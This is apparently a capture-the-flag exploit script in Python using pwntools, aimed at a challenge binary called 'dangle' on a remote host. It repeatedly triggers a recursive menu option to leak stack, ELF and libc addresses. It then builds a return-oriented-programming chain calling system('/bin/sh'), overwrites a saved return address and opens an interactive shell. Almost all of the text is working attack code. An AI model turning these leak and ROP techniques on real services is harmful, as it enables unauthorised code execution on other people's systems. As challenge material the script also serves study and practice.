#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
# context.log_level = 'debug'

# 436 Frames - found manually in gdb with trial and error
FRAMES_NEEDED_TO_RET_ADDR = 436
# 433 Frames - found with findUsefulAddresses()
FRAMES_NEEDED_TO_LEAK_ADDR_FROM_ELF = 433
# 368 Frames - found with findUsefulAddresses()
FRAMES_NEEDED_TO_LEAK_LIBC_ADDR = 368

elf = context.binary = ELF(args.EXE or 'dangle')
libc = ELF('./libc6-amd64_2.36-9+deb12u3_i386.so') if not args.LOCAL else elf.libc
libcROP = ROP(libc)

host = args.HOST or 'dangle-me.knping.pl'
port = int(args.PORT or 30000)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


''' 
* Description: Automated finding a leaked address that is not on the stack

When playing around with the recursive call in game_handler(), I found out that addresses start to leak at the 344th stack frame.

So I set the automation to start by sending option (2) 344 times, to create 344 stack frames that addresses will start to leak.  
Then it gradually keeps sending option (2) one at a time, and parses the leaked address. If the address is not on the stack, it halts.
To check if the address is not on the stack, I ran the binary locally and noticed in GDB that everytime addresses on the stack starts with 0x7ff. Therefore I checked for the third nibble 'f' to determine it.
'''

def findUsefulAddresses(io):
    start_amount = 344  # At the 344th frame and so on, addresses start leaking
    sendAndLeak(start_amount, io)
    counter = 0
    isDone = False
    while not isDone:

        # Keep sending '2' option one at a time and check for the leaked address until we find something interesting (we look at that address in gdb)
        print(f'\n\n[*] current amount = {start_amount+counter}')
        leak = hex(sendAndLeak(1, io))
        counter += 1
        # len(leak) > 5 - To avoid "wrong" leaked addresses such as 0x0 and meaningless addresses
        # leak[4] != 'f' - I assumed that addresses who don't have the forth nibble 'f', are not in the stack (based on the elf's memory mappings in my pc, what turned out to be true)
        if len(leak) > 5 and leak[4] != 'f':
            print(
                f'\n\n\n\n\n[[*******]] FOUND SOME ADDRESS - {leak};\n[[*******]] Frames amount = {start_amount+counter}')
            isDone = True if input(
                "Done (y/n): ").lower().startswith("y") else False


def leakAddr(io):
    io.send(b'1')
    line = io.recvline()
    print(f'[*] Unsorted leaked addr: {line}')

    # Sometimes the leaked values are not addresses, so we use try and except to avoid crashing
    try:
        leaked_stack = u64(line.split(b'is')[1].split(b',')[
                           0].strip().ljust(8, b'\x00'))
    except struct.error as e:
        print(f'\n\n\n\n\t[***] Exception! {e}\n\n\n\n')
        return 0
    else:
        print(f'[*] Leaked addr: {hex(leaked_stack)}')

    return leaked_stack


def send2Option(sendAmount: int, io):
    io.sendlineafter(b'> ', b'2'*sendAmount)


def sendAndLeak(amount: int, io):
    send2Option(amount, io)
    io.clean(1)

    leaked = leakAddr(io)
    return leaked


def leakLibc(io):
    send2Option(FRAMES_NEEDED_TO_LEAK_LIBC_ADDR, io)
    io.clean(1)

    io.send(b'1')
    leak = u64(io.recvuntil(b'dear').split(b"You\'re a fals")
               [38].split(b',')[0].strip().ljust(8, b'\x00'))
    print(f'[*] Libc address leaked: {hex(leak)}')
    return leak


def leakElf():
    # Leaking address from the elf memory mapping to deafet PIE
    leak_from_elf_mapping = sendAndLeak(FRAMES_NEEDED_TO_LEAK_ADDR_FROM_ELF)
    # Removing the last 2 bytes of the leaked address to get the base
    elf.address = leak_from_elf_mapping & ~0xffff
    print(f'[*] Calculated elf base address: {hex(elf.address)}')


# Exploit starts HERE
def main():
    io = start()

    # Leak libc
    libc_leak = leakLibc(io)
    # Checked for this symbol in my elf's mapping
    libc_base = libc_leak - libc.sym['_IO_2_1_stdin_']
    print(f'[**] Libc base address: {hex(libc_base)}\n')

    system = libc_base + libc.sym['system']  # Calculating system address
    bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))  # Calculating "bin/sh" address
    pop_rdi = libc_base + (libcROP.find_gadget(['pop rdi', 'ret']))[0]  # Calculating "pop rdi; ret" gadget address
    ret = libc_base + (libcROP.find_gadget(['ret']))[0]  # Calculating "ret" gadget address

    print(f'[***] system addr = {hex(system)}')
    print(f'[***] bin_sh addr = {hex(bin_sh)}')
    print(f'[***] pop_rdi addr = {hex(pop_rdi)}')
    print(f'[***] ret addr = {hex(ret)}')

    system = p64(system)
    bin_sh = p64(bin_sh)
    pop_rdi = p64(pop_rdi)
    ret = p64(ret)

    # Crafting the rop chain
    offset = b'A'*8
    payload = [
        offset,
        ret,  # Added for stack alignment
        ret,
        ret,
        pop_rdi,
        bin_sh,
        system
    ]
    payload = b''.join(payload)

    # Sending the remaining padding for the payload
    send2Option(FRAMES_NEEDED_TO_RET_ADDR -
                FRAMES_NEEDED_TO_LEAK_LIBC_ADDR, io)

    # Now we override a saved return address on the stack of some frame
    io.sendline(b'4')
    io.sendlineafter(b': ', payload)

    # Finally we return from the function, thus triggering the payload that acts as the "saved return address on the stack"
    io.sendline(b'5')

    io.interactive()


if __name__ == '__main__':
    main()
